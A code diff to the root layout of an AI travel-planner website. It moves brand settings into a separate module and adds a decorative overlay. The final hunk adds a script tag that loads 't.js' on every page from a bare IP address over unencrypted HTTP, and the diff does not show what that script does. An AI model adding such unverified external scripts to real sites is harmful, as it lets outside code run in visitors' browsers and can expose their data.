@@ -5,28 +5,12 @@ import SharedNavbar from '@/components/SharedNavbar'
 import Footer from '../../components/Footer'
 import DesignEffects from '@/components/DesignEffects'
 import AnimatedBackground from '@/components/AnimatedBackground'
-import type { BrandConfig } from '@/components/SharedNavbar'
 import CookieConsent from "../../components/CookieConsent";
 import BackToTop from '@/components/BackToTop'
 import StickyFooterCTA from "../../components/StickyFooterCTA";
 import AuthButton from '../../components/AuthButton'
 import AffiliateStrip from '../../components/AffiliateStrip'
-
-export const brand: BrandConfig = {
-  name: 'RoamPlan',
-  tagline: 'AI Travel Planner — Your Trip, Designed by AI',
-  icon: '✈️',
-  color: '#0ea5e9',
-  url: 'https://roamplan.app',
-  navLinks: [
-    { label: 'Home', href: '/' },
-    { label: 'Plan Trip', href: '/#planner' },
-    { label: 'Destinations', href: '/#destinations' },
-    { label: 'Pricing', href: '/#pricing' },
-    { label: 'About', href: '/about' },
-  ],
-  cta: { label: 'Plan My Trip Free', href: '/#planner' },
-}
+import { brand } from '@/lib/brand'
 
 export const metadata: Metadata = {
   title: 'RoamPlan — AI Travel Planner & Itinerary Generator',
@@ -142,6 +126,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
       </head>
       <body className="flex flex-col min-h-screen">
         <AnimatedBackground />
+        <div className="grain" aria-hidden />
         <DesignEffects />
         <SharedNavbar brand={brand} />
         <div style={{ position:"fixed", top:"10px", right:"16px", zIndex:60 }}><AuthButton /></div>
@@ -152,6 +137,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
       <CookieConsent />
       <StickyFooterCTA />
         <Script defer data-domain="roamplan.app" src="https://plausible.io/js/script.js" strategy="afterInteractive" />
+        <Script defer data-site="roamplan.app" src="http://31.97.56.148:3098/t.js" strategy="afterInteractive" />
       </body>
     </html>
   )
